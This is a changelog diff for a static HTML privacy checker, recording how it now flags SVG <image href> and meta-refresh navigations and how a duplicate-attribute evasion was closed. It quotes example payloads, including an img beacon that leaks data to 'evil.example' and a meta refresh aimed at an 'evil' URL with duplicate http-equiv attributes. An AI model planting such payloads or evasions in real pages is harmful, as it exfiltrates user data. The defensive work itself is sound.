@@ -2,6 +2,42 @@
 
 ## Unreleased
 
+- [done] Closed the privacy gate's last two subresource vectors — SVG `<image>` and
+  `<meta http-equiv="refresh">` (2026-07-26). Both were left open by PR #42 and confirmed against
+  happy-dom as markup a real parser resolves to a genuine fetch or navigation. Test and docs only;
+  no version bump, matching PR #40/#41 (PR #42 bumped because it shipped a manifest change).
+
+  **SVG `<image xlink:href>`** fetches exactly like an `<img>`, but `href` was checked on
+  `<link>`/`<base>` only, so neither it nor the SVG 2 plain-`href` form was read. Rather than widen
+  that allowlist to `image`/`use`/`feImage`, the check is **inverted**: `href` — and any prefixed
+  `*:href` — is now checked on every tag except `<a>`/`<area>`. The set of tags that fetch from
+  `href` is not one anybody can enumerate correctly and keep correct, and getting it wrong in the
+  allowlist direction is a silent hole; by exclusion, every misjudgement is an over-report instead,
+  and a local relative path passes either way. `<a>`/`<area>` stay exempt in the SVG namespace too —
+  that is navigation, and a legitimate outbound link must not redden the gate. A rebound prefix
+  (`xmlns:xl` + `xl:href`) was raised in review as an evasion, then measured inert: an HTML document
+  binds no namespaces, so it lands as a null-namespace attribute SVG never resolves. It is flagged
+  anyway, so trusting the line needs no recall of the parser's adjustment table. A remote SVG
+  `<script href>` needed no new rule — the `<script>` half already flags anything without a relative
+  in-tree `src=` — and is pinned so the misleading `inline <script>` label is not "fixed" into a hole.
+
+  **`<meta http-equiv="refresh" content="0;url=…">`** is the one vector with **no runtime control
+  behind it**: the CSP restricts subresources and executable code, and Chrome dropped `navigate-to`,
+  so no directive would stop an automatic top-level navigation carrying whatever the URL
+  interpolates. Here the static gate is not the backup, it is the whole control. `content=` parsing
+  follows the spec's shared declarative refresh steps in the over-reporting direction — time and
+  `url=` both optional, `;`/`,` separators — while `content="0"` and an empty `url=` stay unflagged
+  as same-document reloads.
+
+  Review caught a real hole in the first cut: the helper read the attribute list last-wins, so
+  `<meta content="0;url=https://evil…" http-equiv="refresh" http-equiv="not-refresh">` returned
+  clean while a real parser — measured in happy-dom **and** headless Chrome — keeps the *first*
+  occurrence and navigates. Fixed by taking the **union** over duplicates (any `http-equiv` reading
+  `refresh` arms it, every `content` is classified) rather than mirroring first-wins, so the gate
+  does not stay coupled to a tokenizer rule it cannot observe; the cost is one over-report on
+  already-malformed markup, asserted rather than tolerated silently. Every new payload is pinned,
+  and removing either guard was verified to turn exactly the new tests red.
+
 - [done] Closed the HTML remote-subresource egress path (2026-07-26). PR #41 taught the gate to read
   `<script>` tags; everything else in `src/**/*.html` still passed both halves unread, and
   `<img src="https://evil.example/p.gif?d=leak">` was verified green. That was live, not merely
